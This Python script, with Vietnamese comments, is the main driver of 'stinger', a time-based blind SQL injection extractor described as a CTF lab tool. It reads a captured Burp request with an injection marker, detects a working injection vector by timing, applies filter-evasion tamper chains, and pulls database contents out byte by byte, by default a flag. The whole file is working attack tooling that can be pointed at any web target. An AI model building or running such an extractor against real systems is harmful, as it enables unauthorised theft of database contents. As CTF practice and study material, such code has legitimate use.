#!/usr/bin/env python3
"""
stinger - inline time-based blind SQLi extractor cho lab CTF.

Ghép tất cả: parse Burp request -> đo/chốt vector (TRUE/FALSE) -> trích xuất -> verify.

Ví dụ (chạy từ thư mục root qua main.py):
    python main.py -r draft/requests.txt --query "select content from final_flag limit 1"
    python main.py -r req.txt --dbms mysql --vector mysql-inline-sleep
    python main.py -r req.txt --tamper between,space2comment
    python main.py -r req.txt --dbms auto -v

Marker: chèn '*' vào vị trí inject trong file request (vd {"id":"*"}).
"""

from __future__ import annotations

import argparse
import sys
import time

from stinger.request import parse_request_file, RequestParseError
from stinger.transport import Transport, TransportError
from stinger.vectors import VectorStore, detect_vector, VectorError
from stinger.oracle import Oracle
from stinger.extract import extract, verify, ExtractError
from stinger.tamper_engine import TamperChain, TamperError

DEFAULT_QUERY = "select content from final_flag limit 1"


def _build_measure(transport, tamper_chain, dbms_hint):
    """Bọc transport.measure thêm bước tamper (đúng THỨ TỰ DESIGN: tamper trước khi gửi).

    request.py đã lo Content-Length SAU khi payload (đã tamper) được chèn -> đúng thứ tự.
    """
    if not tamper_chain:
        return transport.measure

    def measure(payload):
        tampered = tamper_chain.apply(payload, dbms=dbms_hint)
        return transport.measure(tampered)

    return measure


def main(argv=None):
    p = argparse.ArgumentParser(
        prog="stinger",
        description="Inline time-based blind SQLi extractor (CTF).",
    )
    p.add_argument("-r", "--request", required=True,
                   help="file request (Burp), có marker '*' ở vị trí inject")
    p.add_argument("--query", default=DEFAULT_QUERY,
                   help="câu truy vấn cần trích xuất (mặc định: lấy flag)")
    p.add_argument("--dbms", default="auto",
                   help="mysql|postgresql|mssql|oracle|auto (mặc định auto)")
    p.add_argument("--vector", default=None,
                   help="ép dùng một vector theo tên (bỏ qua bước dò)")
    p.add_argument("--mode", choices=("hex", "char"), default="hex",
                   help="chế độ trích xuất (mặc định hex - an toàn, bắt multibyte)")
    p.add_argument("--tamper", default=None,
                   help="danh sách tamper cách nhau dấu phẩy (vd between,space2comment)")
    p.add_argument("--delay", type=float, default=3.0,
                   help="số giây sleep (mặc định 3)")
    p.add_argument("--votes", type=int, default=1, choices=(1, 3),
                   help="3 = bỏ phiếu đa số (dùng khi mạng nhiễu)")
    p.add_argument("--pause", type=float, default=0.0,
                   help="nghỉ giữa các request (chống reset)")
    p.add_argument("--timeout", type=float, default=30.0)
    p.add_argument("--retries", type=int, default=4)
    p.add_argument("--maxlen", type=int, default=None)
    p.add_argument("--vectors-file", default=None,
                   help="đường dẫn vectors.yaml tùy chỉnh")
    p.add_argument("-v", "--verbose", action="store_true")
    a = p.parse_args(argv)

    def log(msg):
        print(msg)

    # 1) parse request
    try:
        base = parse_request_file(a.request)
    except (RequestParseError, OSError) as e:
        print("[!] lỗi đọc request: %s" % e)
        return 2
    if not base.has_marker():
        print("[!] request không có marker '*'. Chèn '*' vào vị trí inject "
              "(vd {\"id\":\"*\"}) rồi thử lại.")
        return 2

    print("[*] target : %s" % base.url())
    print("[*] method : %s" % base.method)
    print("[*] marker : %s" % base.marker_location())
    print("[*] query  : %s" % a.query)

    # 2) tamper chain (nếu có)
    tamper_chain = None
    if a.tamper:
        names = [n.strip() for n in a.tamper.split(",") if n.strip()]
        try:
            tamper_chain = TamperChain.from_names(names)
        except TamperError as e:
            print("[!] lỗi tamper: %s" % e)
            return 2
        print("[*] tamper : %s" % " -> ".join(n for n, _ in tamper_chain.order()))

    # 3) transport
    try:
        transport = Transport(base, timeout=a.timeout, retries=a.retries, pause=a.pause)
    except TransportError as e:
        print("[!] %s" % e)
        return 2

    dbms_hint = None if a.dbms == "auto" else a.dbms
    measure = _build_measure(transport, tamper_chain, dbms_hint)

    # 4) đo & chốt vector
    try:
        store = VectorStore.load(a.vectors_file)
    except VectorError as e:
        print("[!] %s" % e)
        return 2

    print("\n[*] dò vector (xác nhận bằng TRUE/FALSE)...")
    try:
        detect = detect_vector(store, measure, sleeptime=a.delay,
                               dbms=a.dbms, forced_vector=a.vector, log=log)
    except VectorError as e:
        print("[!] %s" % e)
        return 3

    dialect = store.dialect(detect.vector.dbms)

    # 5) trích xuất
    oracle = Oracle(detect, measure, sleeptime=a.delay,
                    votes=a.votes, verbose=a.verbose, log=log)

    def progress(done, total, preview):
        print("\r[%3d/%s] %s" % (done, total, preview), end="", flush=True)

    print("\n[*] trích xuất (chế độ %s, DBMS %s)...\n" % (a.mode, detect.vector.dbms))
    t0 = time.time()
    try:
        data, meta = extract(oracle, a.query, dialect, mode=a.mode,
                             maxlen=a.maxlen, progress=progress, log=log)
    except ExtractError as e:
        print("\n[!] %s" % e)
        return 3
    print()

    # 6) verify
    ok = False
    try:
        ok = verify(oracle, a.query, dialect, data)
    except Exception:
        pass

    # 7) kết quả
    print("\n" + "=" * 60)
    print("raw bytes :", data)
    print("hex       :", data.hex())
    print("utf-8     :", data.decode("utf-8", "replace"))
    print("độ dài    : %d byte / %s ký tự" % (len(data), meta.get("char_len")))
    print("vector    : %s/%s" % (detect.vector.dbms, detect.vector.name))
    print("verify    : %s" % ("KHỚP" if ok else "KHÔNG KHỚP (!)"))
    print("chi phí   : %d request, %.0fs" % (transport.n_req, time.time() - t0))
    print("=" * 60)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
